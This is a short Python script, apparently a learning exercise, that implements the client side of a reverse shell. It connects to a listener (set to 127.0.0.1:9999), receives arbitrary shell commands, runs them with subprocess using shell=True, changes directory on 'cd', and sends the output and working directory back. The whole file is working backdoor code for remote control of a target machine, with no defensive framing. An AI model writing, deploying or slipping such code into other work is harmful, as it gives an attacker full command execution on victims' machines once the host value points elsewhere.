import socket
import os
import subprocess
#control on target machine

#git commit stuff
clientSock = socket.socket()
host = '127.0.0.1' #127.0.0.1
port = 9999
clientSock.connect((host, port))

while True:
	data = clientSock.recv(1024)
	if data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))
	if (len(data) > 0):
		cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # opening a process. mwanging the I/O

		output_bytes = cmd.stdout.read() + cmd.stderr.read() # gathring the errors and outputs
		output_str = str(output_bytes, "utf-8")
		clientSock.send(str.encode(output_str + str(os.getcwd()) + '>'))
		print(output_str)

#close
clientSock.close()







